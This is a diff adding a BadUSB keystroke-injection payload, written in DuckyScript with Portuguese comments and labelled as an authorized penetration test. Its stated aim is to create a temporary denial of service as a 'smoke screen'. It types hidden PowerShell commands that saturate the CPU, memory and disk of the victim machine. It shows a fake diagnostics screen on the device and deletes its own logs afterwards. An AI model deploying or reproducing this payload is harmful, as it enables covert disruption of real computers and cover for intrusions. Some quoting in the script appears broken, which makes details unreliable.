@@ -1,0 +1,181 @@
+REM =====================================================================
+REM PAYLOAD 2: Stress Test Controlado (Cortina de Fumaça)
+REM Pentest Autorizado - Incoflandres
+REM Objetivo: Simular DoS temporário como cortina de fumaça
+REM Status: Não-destrutivo / Auto-reversível após reinicialização
+REM =====================================================================
+
+REM Configuração inicial e interface visual
+LED_OFF
+DISPLAY_CLEAR
+WIFI_ON
+
+REM Interface de diagnóstico do sistema
+DISPLAY_TEXT 0 0 Diagnostico Sistema
+DISPLAY_TEXT 0 10 Incoflandres v3.2
+DISPLAY_TEXT 0 20 Teste de stress...
+
+REM LED indicando início do teste
+LED 255 255 0 150
+DELAY 2000
+
+REM Fase 1: Script de CPU Load (Cortina de fumaça principal)
+DISPLAY_TEXT 0 30 CPU Load Test: ON
+GUI R
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Command "
+DELAY 500
+
+REM Script PowerShell para stress controlado de CPU
+STRING $StressJob = Start-Job -ScriptBlock {
+DELAY 300
+STRING   $cores = (Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors;
+DELAY 300
+STRING   $jobs = @();
+DELAY 300
+STRING   for($i=1; $i -le $cores; $i++) {
+DELAY 300
+STRING     $jobs += Start-Job -ScriptBlock {
+DELAY 300
+STRING       $start = Get-Date;
+DELAY 300
+STRING       while((Get-Date) -lt $start.AddMinutes(3)) {
+DELAY 300
+STRING         $math = 1;
+DELAY 300
+STRING         for($j=1; $j -le 100000; $j++) { $math += $j * 2 };
+DELAY 300
+STRING         Start-Sleep -Milliseconds 10
+DELAY 300
+STRING       }
+DELAY 300
+STRING     }
+DELAY 300
+STRING   };
+DELAY 300
+STRING   Wait-Job $jobs | Remove-Job
+DELAY 300
+STRING };
+DELAY 1000
+
+REM Atualizar display para Memory Load
+LED 255 100 0 200
+DISPLAY_TEXT 0 40 Memory Test: ON
+DELAY 1000
+
+REM Script para Memory Load controlado
+STRING $MemJob = Start-Job -ScriptBlock {
+DELAY 300
+STRING   $arrays = @();
+DELAY 300
+STRING   $maxMB = 512;
+DELAY 300
+STRING   for($i=1; $i -le $maxMB; $i++) {
+DELAY 300
+STRING     try {
+DELAY 300
+STRING       $arrays += New-Object byte[] (1024*1024);
+DELAY 300
+STRING       Start-Sleep -Milliseconds 50;
+DELAY 300
+STRING       if($i % 100 -eq 0) { [System.GC]::Collect() }
+DELAY 300
+STRING     } catch { break }
+DELAY 300
+STRING   };
+DELAY 300
+STRING   Start-Sleep -Seconds 120;
+DELAY 300
+STRING   $arrays = $null;
+DELAY 300
+STRING   [System.GC]::Collect()
+DELAY 300
+STRING };
+DELAY 1000
+
+REM Script de Disk I/O Load (leve)
+DISPLAY_TEXT 0 50 Disk I/O Test: ON
+STRING $DiskJob = Start-Job -ScriptBlock {
+DELAY 300
+STRING   $tempPath = '$env:TEMP\incoflandres_stress_test';
+DELAY 300
+STRING   for($i=1; $i -le 100; $i++) {
+DELAY 300
+STRING     try {
+DELAY 300
+STRING       $data = 'x' * 10240;
+DELAY 300
+STRING       $data | Out-File -FilePath ('$tempPath' + $i + '.tmp') -Encoding ASCII;
+DELAY 300
+STRING       Start-Sleep -Milliseconds 100
+DELAY 300
+STRING     } catch { break }
+DELAY 300
+STRING   };
+DELAY 300
+STRING   Start-Sleep -Seconds 60;
+DELAY 300
+STRING   Remove-Item '$tempPath*.tmp' -Force -ErrorAction SilentlyContinue
+DELAY 300
+STRING };
+DELAY 1000
+
+REM Log das atividades (para análise posterior)
+STRING echo 'Stress Test Started:' (Get-Date) | Out-File -FilePath '$env:TEMP\stress_log.txt' -Append;
+DELAY 500
+STRING exit"
+ENTER
+
+REM Mostrar efeito visual do "stress test"
+DELAY 3000
+LED 255 0 0 255
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 ALERTA SISTEMA
+DISPLAY_TEXT 0 10 CPU: 95%% MEMORY: 87%%
+DISPLAY_TEXT 0 20 DISK I/O: HIGH
+DELAY 2000
+
+REM Simular travamento/lentidão visual
+DISPLAY_TEXT 0 30 Sistema lento...
+DELAY 1000
+DISPLAY_TEXT 0 40 Aguarde ou reinicie
+DELAY 1000
+
+REM Piscar LED para simular "travamento"
+LOOP 10
+  LED 255 0 0 255
+  DELAY 500
+  LED_OFF
+  DELAY 500
+END_LOOP
+
+REM Auto-limpeza após tempo determinado
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Limpeza automatica
+DISPLAY_TEXT 0 10 Finalizando testes...
+LED 0 255 0 100
+
+REM Script de limpeza
+GUI R
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Command "
+STRING Get-Job | Stop-Job; Get-Job | Remove-Job;
+DELAY 500
+STRING Remove-Item '$env:TEMP\incoflandres_stress_test*.tmp' -Force -ErrorAction SilentlyContinue;
+DELAY 500
+STRING Remove-Item '$env:TEMP\stress_log.txt' -Force -ErrorAction SilentlyContinue;
+DELAY 500
+STRING exit"
+ENTER
+
+REM Indicação de conclusão
+DELAY 3000
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Teste concluido
+DISPLAY_TEXT 0 10 Sistema normalizado
+DISPLAY_TEXT 0 20 Pressione para reset
+LED 0 255 0 255
+
+REM Aguardar remoção
+WAIT_FOR_BUTTON_PRESS
+RESET
